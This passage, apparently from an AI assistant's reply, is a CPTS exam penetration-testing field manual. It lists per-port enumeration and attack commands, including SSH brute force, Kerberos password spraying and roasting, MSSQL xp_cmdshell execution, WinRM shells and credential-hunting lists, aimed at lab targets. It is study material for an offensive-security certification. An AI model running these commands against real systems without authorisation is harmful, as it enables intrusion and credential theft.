


```text
Nmap
CrackMapExec
Impacket
BloodHound
```

But:

```text
445 Open
   ↓
What can I do?

389 Open
   ↓
What can I do?

SQL Credentials Found
   ↓
What can I do?
```

---

# 🎯 PENTEST FIELD MANUAL

## Phase 0 — Automatic Recon

Never think.

Run:

```bash
TARGET=10.129.XXX.XXX

sudo nmap -Pn -n -p- \
--min-rate 5000 \
--max-retries 2 \
-oA tcp_all \
$TARGET
```

Extract ports:

```bash
PORTS=$(grep open tcp_all.gnmap | \
cut -d ":" -f2 | \
cut -d " " -f1 | \
tr '\n' ',' | \
sed 's/,$//')

echo $PORTS
```

---

Enumerate:

```bash
sudo nmap \
-sC \
-sV \
-O \
-p$PORTS \
-oA enum \
$TARGET
```

---

# 🚨 PORT 21 (FTP)

## Anonymous

```bash
ftp $TARGET
```

```text
anonymous
anonymous
```

---

## NSE

```bash
nmap --script ftp-anon,ftp-syst -p21 $TARGET
```

---

## Download Everything

```bash
wget -m ftp://anonymous:anonymous@$TARGET
```

---

## Look For

```text
passwords
backups
configs
sql dumps
zip files
ssh keys
```

---

# 🚨 PORT 22 (SSH)

## Enumerate

```bash
nmap \
--script ssh-auth-methods \
-p22 \
$TARGET
```

---

## Algorithms

```bash
nmap \
--script ssh2-enum-algos \
-p22 \
$TARGET
```

---

## Found Username?

Try:

```bash
hydra \
-l user \
-P rockyou.txt \
ssh://$TARGET
```

---

## Found Private Key?

```bash
chmod 600 id_rsa

ssh \
-i id_rsa \
user@$TARGET
```

---

# 🚨 PORT 25 (SMTP)

## Banner

```bash
nc $TARGET 25
```

---

## User Enumeration

```bash
smtp-user-enum \
-M VRFY \
-U users.txt \
-t $TARGET
```

---

## Nmap

```bash
nmap \
--script smtp-enum-users \
-p25 \
$TARGET
```

---

# 🚨 PORT 53 (DNS)

## Zone Transfer

```bash
dig axfr \
@$TARGET \
domain.local
```

---

## Bruteforce

```bash
gobuster dns \
-d domain.local \
-w dns.txt
```

---

## NSE

```bash
nmap \
--script dns-zone-transfer \
-p53 \
$TARGET
```

---

# 🚨 PORT 80 / 443 (WEB)

# ALWAYS

```bash
whatweb http://$TARGET
```

```bash
curl -I http://$TARGET
```

```bash
nikto -h http://$TARGET
```

---

# FFUF

## Directories

```bash
ffuf \
-u http://$TARGET/FUZZ \
-w common.txt
```

---

## VHOSTS

```bash
ffuf \
-u http://$TARGET \
-H "Host: FUZZ.domain.local" \
-w subdomains.txt
```

---

## Parameters

```bash
ffuf \
-u 'http://$TARGET/index.php?FUZZ=test' \
-w burp-parameter-names.txt
```

---

## Extensions

```bash
ffuf \
-u http://$TARGET/FUZZ \
-w raft-medium-files.txt \
-e .php,.txt,.bak,.zip,.old
```

---

# Look For

```text
login pages
admin panels
uploads
api docs
swagger
graphql
git folders
backup files
robots.txt
```

---

# 🚨 PORT 111 (RPC)

```bash
rpcinfo -p $TARGET
```

---

Often means:

```text
NFS
Mountable shares
```

---

# 🚨 PORT 2049 (NFS)

## Shares

```bash
showmount -e $TARGET
```

---

## Mount

```bash
sudo mount \
-t nfs \
$TARGET:/share \
/mnt/nfs
```

---

## Look For

```text
ssh keys
passwords
configs
bash history
backups
```

---

# 🚨 PORT 139 / 445 (SMB)

# THE MONEY PORT

---

## Null Session

```bash
netexec smb \
$TARGET \
-u '' \
-p ''
```

---

## Guest

```bash
netexec smb \
$TARGET \
-u guest \
-p ''
```

---

## Shares

```bash
netexec smb \
$TARGET \
--shares
```

---

## Users

```bash
netexec smb \
$TARGET \
--users
```

---

## Groups

```bash
netexec smb \
$TARGET \
--groups
```

---

## Sessions

```bash
netexec smb \
$TARGET \
--sessions
```

---

## Spider

```bash
netexec smb \
$TARGET \
-M spider_plus
```

---

## Download

```bash
smbclient \
-L //$TARGET
```

---

```bash
smbclient \
//$TARGET/share
```

---

# Files To Hunt

```text
*.kdbx
*.xlsx
*.pdf
*.txt
*.xml
*.config
*.ps1
*.bat
*.rdp
*.vhd
```

---

# 🚨 PORT 88 (KERBEROS)

# Username Enumeration

```bash
kerbrute userenum \
users.txt \
-d domain.local \
--dc $TARGET
```

---

# Password Spray

```bash
kerbrute passwordspray \
users.txt \
Password123 \
-d domain.local
```

---

# ASREP Roast

```bash
GetNPUsers.py \
domain.local/ \
-no-pass \
-usersfile users.txt \
-dc-ip $TARGET
```

---

# Kerberoast

```bash
GetUserSPNs.py \
domain.local/user:pass \
-dc-ip $TARGET \
-request
```

---

# 🚨 PORT 389 / 636 LDAP

## Anonymous Bind

```bash
ldapsearch \
-x \
-H ldap://$TARGET \
-b "dc=domain,dc=local"
```

---

## Dump Everything

```bash
ldapdomaindump \
ldap://$TARGET
```

---

## BloodHound

```bash
bloodhound-python \
-u user \
-p pass \
-d domain.local \
-ns $TARGET \
-c All
```

---

# 🚨 PORT 5985 (WINRM)

## Check

```bash
netexec winrm \
$TARGET \
-u users.txt \
-p passwords.txt
```

---

## Shell

```bash
evil-winrm \
-i $TARGET \
-u user \
-p password
```

---

# 🚨 PORT 1433 (MSSQL)

## Connect

```bash
impacket-mssqlclient \
user:pass@$TARGET
```

---

## Check Sysadmin

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

---

## Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

---

## Execute

```sql
xp_cmdshell whoami
```

---

# 🚨 PORT 3306 (MYSQL)

```bash
mysql \
-h $TARGET \
-u root \
-p
```

---

## Loot

```sql
show databases;
```

```sql
use database;
```

```sql
show tables;
```

---

# 🚨 PORT 6379 (REDIS)

```bash
redis-cli -h $TARGET
```

---

## Check

```text
INFO
```

---

# 🚨 PORT 27017 (MONGODB)

```bash
mongosh mongodb://$TARGET
```

---

## Databases

```javascript
show dbs
```

---

# 🏢 ACTIVE DIRECTORY PLAYBOOK

When you obtain:

```text
username
password
hash
ticket
ccache
```

Immediately:

---

## Validate

```bash
netexec smb
```

```bash
netexec winrm
```

```bash
netexec mssql
```

---

## BloodHound

```bash
bloodhound-python \
-c All
```

---

## Password Reuse

```bash
netexec smb \
targets.txt \
-u user \
-p password
```

---

## Local Admin Check

```bash
netexec smb \
targets.txt \
-u user \
-p password
```

Look for:

```text
Pwn3d!
```

---

# 🎯 Files That Win Boxes

Always search for:

```text
password
passwd
creds
credential
secret
token
api
jwt
backup
db
database
vpn
.ovpn
.kdbx
.id_rsa
.config
.xml
.ini
.env
.ps1
```

---

# 🔥 After Initial Foothold

Linux:

```bash
linpeas.sh
```

```bash
sudo -l
```

```bash
find / -perm -4000 2>/dev/null
```

```bash
getcap -r / 2>/dev/null
```

---

Windows:

```powershell
whoami /all
```

```powershell
winPEASx64.exe
```

```powershell
net user
```

```powershell
net localgroup administrators
```

```powershell
Get-ChildItem -Recurse C:\Users
```

---

# 🧠 CPTS Exam Reality

The majority of boxes eventually fall because of:

```text
SMB
LDAP
Kerberos
WinRM
MSSQL
Passwords in shares
Password reuse
BloodHound paths
Misconfigured web apps
```

Not because of obscure NSE scripts.

The highest ROI skills are:

```text
1. Reading Nmap output
2. SMB enumeration
3. LDAP enumeration
4. Kerberos attacks
5. BloodHound analysis
6. Credential hunting
7. Password spraying
8. Privilege escalation
```

That's the field manual I'd actually keep open during CPTS rather than a giant catalog of Nmap switches. It minimizes decision fatigue and tells you what to do immediately after each finding.
